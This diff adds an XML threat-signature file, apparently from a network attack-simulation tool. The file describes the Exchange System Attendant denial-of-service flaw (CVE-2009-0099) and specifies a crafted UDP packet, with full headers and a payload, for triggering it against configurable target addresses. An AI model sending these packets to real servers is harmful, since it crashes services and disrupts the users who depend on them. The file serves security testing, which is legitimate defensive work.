@@ -1,0 +1,73 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Microsoft Exchange System Attendant Denial of Service"/>
+    <EngDesc display="true" value="A denial of service vulnerability exists in the Microsoft Exchange System Attendant. The vulnerability is a result of insufficient validation when processing crafted parameters supplied to the System Attendant service. Successful exploitation of this vulnerability can allow a remote unauthenticated attacker to terminate the affected service, causing a denial of service condition.            Upon triggering this vulnerability, the System Attendant service on the target server will terminate abnormally. Users may experience interruption and temporary unavailability of all services hosted by the affected process such as: address list maintenance, enforcement of message retention policies, resource monitoring, and others. To restore functionality, the affected service needs to be manually restarted."/>
+    <Intent display="true">
+      <item value="MEMORY_ACCESS_ERROR"/>
+    </Intent>
+    <Protocol display="true" value="UDP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft_Microsoft_Exchange_Server"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true"/>
+    <Credit display="true" value="FSC20090210-12"/>
+    <CVEID display="true" value="CVE-2009-0099"/>
+    <bugtraqID display="true" value="33136"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="d6d27ee48713d65be2301b1f66963497"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="not-required"/>
+    <IntegImpact display="false" value="not-required"/>
+    <AvailImpact display="false" value="Complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="633753958886451724"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1250667222" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0024" Identification="937F" FragmentOffset="0000" TTL="40" Protocol="11" HeaderChecksum="456F" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="@random(1026,65535)" destPort="$destPort" checksum="0FA7" length="0010" Payload="00000000FFFFFFFF00000000000000000000"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
